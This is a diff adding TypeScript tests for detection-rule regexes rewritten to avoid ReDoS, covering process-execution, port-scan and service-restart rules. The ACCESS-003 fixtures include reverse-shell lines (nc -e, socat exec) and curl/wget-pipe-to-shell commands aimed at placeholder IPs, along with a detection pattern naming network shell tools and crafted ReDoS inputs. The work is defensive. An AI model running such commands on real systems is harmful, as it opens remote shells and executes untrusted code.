@@ -505,3 +505,120 @@ test('every rule that declares flags declares ones the engine accepts', () => {
 
   assert.deepEqual(broken, [], `unusable regex conditions:\n${broken.join('\n')}`);
 });
+
+
+// ---------------------------------------------------------------------------
+// ReDoS rewrites.
+//
+// ACCESS-003, INFRA-001 and INFRA-003 used "X, then later Y" written as X.*Y.
+// That is polynomial ReDoS: on a line of repeated X with no Y the engine
+// rescans the rest of the line from every X, O(n^2) — about 0.3 s per 64 KB
+// line, seconds per 256 KB TCP line, on the thread that runs ingestion. The
+// regex safety gate refuses such patterns, so the rules were rewritten with a
+// gap that cannot contain X again (each X's scan stops at the next X: linear).
+// These pin that the rewrite matches what the old form matched, and stays fast.
+// ---------------------------------------------------------------------------
+
+const REDOS_REWRITES: Array<{
+  file: string;
+  field: string;
+  detects: string[];
+  ignores: string[];
+  /** Lines that made the old X.*Y form quadratic. */
+  hostile: string[];
+  /** The pattern as it was (flags as in the file), to show the rewrite matches the same lines. */
+  old: RegExp;
+}> = [
+  {
+    file: 'access-control/ACCESS-003-unusual-process-execution.yaml',
+    field: 'command',
+    detects: [
+      'curl -fsSL https://get.example.com/install.sh | bash',
+      'curl http://203.0.113.5/x|sh',
+      'wget -qO- http://203.0.113.5/w.sh | sh',
+      'curl -s http://a/1 | tee x; curl -s http://b/2',
+      'socat TCP:203.0.113.5:4444 EXEC:/bin/sh'.replace('EXEC', 'exec'),
+      'socat tcp-connect:203.0.113.5:4444 exec:/bin/bash',
+      '/tmp/.x/payload',
+      'bash -c "id"',
+      'nc -e /bin/sh 203.0.113.5 4444',
+    ],
+    ignores: [
+      'apt-get install curl',
+      'curl -o /var/cache/file https://example.com/a',
+      'wget https://example.com/b.tar.gz',
+      'systemctl restart nginx',
+    ],
+    hostile: ['curlc'.repeat(13_107), 'wgetw'.repeat(13_107), 'socats'.repeat(10_922), 'curl'.repeat(16_384)],
+    old: /(\/tmp\/|curl.*\||wget.*\||bash\s+-c|sh\s+-c|python\s+-c|perl\s+-e|nc\s+-[el]|ncat|socat.*exec)/,
+  },
+  {
+    file: 'infrastructure/INFRA-001-port-scanning.yaml',
+    field: 'message',
+    detects: ['Port 22 closed', 'port 443/tcp is closed', 'Port scan: port 8080 Closed', 'Connection refused'],
+    ignores: ['Port 22 open', 'socket closed', 'closed: port 22'],
+    hostile: ['Port'.repeat(16_384), 'PortP'.repeat(13_107)],
+    old: /([Cc]onnection [Rr]efused|[Cc]onnection [Aa]ttempt|SYN|[Pp]ort.*[Cc]losed|[Nn]o [Rr]oute [Tt]o [Hh]ost)/,
+  },
+  {
+    file: 'infrastructure/INFRA-003-unusual-service-restarts.yaml',
+    field: 'message',
+    detects: [
+      'Starting nginx.service - A high performance web server',
+      'Stopped nginx.service',
+      'nginx.service: Scheduled restart job, restart counter is at 5.',
+      'systemd[1]: docker: hold-off time over, scheduling restart.',
+      'STARTING the backup SERVICE',
+      'Restarting docker',
+    ],
+    ignores: ['user alice logged in', 'GET /health 200', 'service started', 'stopped by user'],
+    hostile: ['service'.repeat(9_362), 'servicess'.repeat(7_281), 'Starting'.repeat(8_192), 'systemd'.repeat(9_362)],
+    old: /(service.*restart|systemd.*restart|Starting.*service|Stopped.*service|restarting)/i,
+  },
+];
+
+/** Deterministic PRNG so a failure reproduces. */
+function prng(seed: number): () => number {
+  return () => {
+    seed = (seed * 1103515245 + 12345) & 0x7fffffff;
+    return seed / 0x7fffffff;
+  };
+}
+
+for (const { file, field, detects, ignores, hostile, old } of REDOS_REWRITES) {
+  const id = path.basename(file).replace('.yaml', '');
+
+  test(`${id}: the linear rewrite matches what the old X.*Y form matched`, () => {
+    const re = ruleRegex(file, field);
+    for (const line of detects) assert.equal(re.test(line), true, `${id} should match ${JSON.stringify(line)}`);
+    for (const line of ignores) assert.equal(re.test(line), false, `${id} should not match ${JSON.stringify(line)}`);
+    for (const line of [...detects, ...ignores]) assert.equal(re.test(line), old.test(line), `old and new agree on ${JSON.stringify(line)}`);
+    // Random single-line soups of the rule's own tokens: the rewrite and the
+    // old form must agree on every one.
+    const words = [
+      ...new Set(
+        (old.source.match(/[A-Za-z|/]+/g) || []).flatMap((w) => w.split('|')).filter((w) => w.length > 0)
+      ),
+      ' ',
+      ' ',
+      '|',
+      'x',
+    ];
+    const rand = prng(7);
+    for (let n = 0; n < 3000; n++) {
+      const line = Array.from({ length: 1 + Math.floor(rand() * 6) }, () => words[Math.floor(rand() * words.length)]).join('');
+      assert.equal(re.test(line), old.test(line), `old and new agree on ${JSON.stringify(line)}`);
+    }
+  });
+
+  test(`${id}: a crafted 64 KB line is matched in linear time`, () => {
+    const re = ruleRegex(file, field);
+    for (const line of hostile) {
+      const started = process.hrtime.bigint();
+      re.test(line);
+      const ms = Number(process.hrtime.bigint() - started) / 1e6;
+      // The old form took ~250-470 ms on these; linear is a few ms.
+      assert.ok(ms < 60, `${id} took ${ms.toFixed(1)} ms on ${JSON.stringify(line.slice(0, 12))}… (${line.length} chars)`);
+    }
+  });
+}
